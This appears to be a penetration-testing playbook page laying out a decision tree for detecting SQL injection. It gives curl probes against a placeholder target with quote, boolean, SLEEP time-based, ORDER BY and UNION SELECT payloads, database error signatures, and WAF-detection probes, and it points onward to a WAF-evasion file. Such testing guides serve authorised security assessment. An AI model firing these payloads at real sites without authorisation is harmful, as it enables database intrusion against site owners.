# SQLi Detection Decision Tree

## Phase 1: Baseline

### Establish Normal Response
```bash
curl -s "https://target.com/page?id=1" -o baseline.html
# Record: status code, length, content hash
```

### Test Injection Points
```bash
# Single quote
curl -s "https://target.com/page?id=1'" | diff - baseline.html

# Double quote
curl -s 'https://target.com/page?id=1"' | diff - baseline.html

# Boolean true
curl -s "https://target.com/page?id=1%20AND%201=1" | diff - baseline.html

# Boolean false
curl -s "https://target.com/page?id=1%20AND%201=2" | diff - baseline.html
```

## Detection Signals

### Error-Based
- MySQL error: `You have an error in your SQL syntax`
- PostgreSQL error: `ERROR: syntax error at or near`
- MSSQL error: `Unclosed quotation mark`
- SQLite error: `SQLITE_ERROR`

### Boolean-Based
- `AND 1=1` matches baseline
- `AND 1=2` differs from baseline
- Consistent difference across multiple tests

### Time-Based
- `AND SLEEP(5)` causes 5+ second delay
- Consistent timing difference

## Response Comparison Checklist

For each test payload, record:
1. Status code (200, 500, 302, etc.)
2. Response length
3. Content differences
4. Response time
5. Error messages

## Test Priority
1. `id=1'` - Basic quote test
2. `id=1 AND 1=1` - Boolean true
3. `id=1 AND 1=2` - Boolean false
4. `id=1' AND '1'='1` - Quoted boolean
5. `id=1' AND SLEEP(5)--` - Time-based
6. `id=1' ORDER BY 1--` - Column count
7. `id=1' UNION SELECT NULL--` - UNION columns

## WAF Detection

If any of these return different response (403, 406, 302):
- `id=1' OR '1'='1`
- `id=1' AND 1=1`
- `id=1' UNION SELECT NULL--`

WAF is likely present - read `waf-evasion.md`
